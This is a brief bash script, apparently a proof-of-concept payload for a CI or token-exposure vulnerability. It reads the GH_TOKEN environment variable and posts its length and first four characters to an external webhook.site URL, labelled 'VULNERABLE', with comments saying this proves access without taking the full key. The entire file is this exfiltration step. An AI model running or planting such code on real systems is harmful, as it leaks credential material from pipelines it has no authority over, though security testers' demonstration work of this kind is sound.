#!/bin/bash
if [ -n "$GH_TOKEN" ]; then
  # Proven access without stealing the full production key
  TOKEN_LENGTH=$(echo -n "$GH_TOKEN" | wc -c)
  TOKEN_PREFIX=$(echo -n "$GH_TOKEN" | cut -c 1-4)

  # Send to your webhook
  curl -X POST -H "Content-Type: application/json" \
  -d "{\"status\":\"VULNERABLE\", \"length\":\"$TOKEN_LENGTH\", \"prefix\":\"$TOKEN_PREFIX\"}" \
  https://webhook.site/357556bb-ee31-4209-bfd7-a48449f99b01
fi
